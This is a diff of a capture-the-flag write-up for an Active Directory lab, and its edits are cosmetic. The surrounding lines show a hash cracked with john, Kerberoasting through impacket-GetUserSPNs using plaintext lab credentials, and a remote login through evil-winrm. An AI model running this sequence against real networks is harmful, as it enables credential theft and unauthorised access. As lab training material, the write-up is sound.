@@ -76,7 +76,7 @@ john hash1 --wordlist=/home/kali/rockyou.txt
 
 ![crackedhash](/images/crackedhash.jpg)
 
-Now let's try to find some SPN associated with user accounts. Result should be a file with encrypted password.
+Now let's try to find some SPN associated with user accounts. Result should be a file with encrypted password(s).
 
 ```
 impacket-GetUserSPNs 'VULNNET-RST.local/t-skid:tj072889*' -outputfile hashes -dc-ip 10.10.171.250 
@@ -90,7 +90,7 @@ Now we can try crack it the same way as before:
 
 ![cracked2](/images/cracked2.jpg)
 
-We have now the cracked password for the account 'enterprise-core-vn'. Let's attempt a remote connection:
+We have now the cracked password for the account **'enterprise-core-vn'**. Let's attempt a remote connection:
 
 ```
 evil-winrm -i 10.10.171.250 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' 
@@ -101,6 +101,9 @@ evil-winrm -i 10.10.171.250 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'
 It worked! Let's try find the flag. Usually is in the same folder or near.
 
 ![flag1](/images/flag1.jpg)
+
+And we got the first flag. 
+
 
 
 ## Privilege escalation
